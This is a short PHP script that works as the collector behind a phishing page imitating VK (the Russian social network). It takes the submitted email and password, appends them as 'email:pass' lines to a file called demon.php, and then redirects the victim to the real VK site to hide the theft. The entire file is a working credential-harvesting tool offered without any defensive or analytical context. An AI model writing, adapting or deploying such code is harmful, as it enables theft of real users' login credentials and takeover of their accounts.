<?php

/**
 * @author Litvinov V.A.
 * @copyright 2016 (2707)
 */

$LOCATION="https://new.vk.com";

$file="demon.php";
$a=$_REQUEST["email"];
$b=$_REQUEST["pass"];
$text=$a.":".$b.":\n";
$ok=fopen($file,"a+");

fwrite($ok,$text);
fclose($ok);

header("Location:$LOCATION");

?>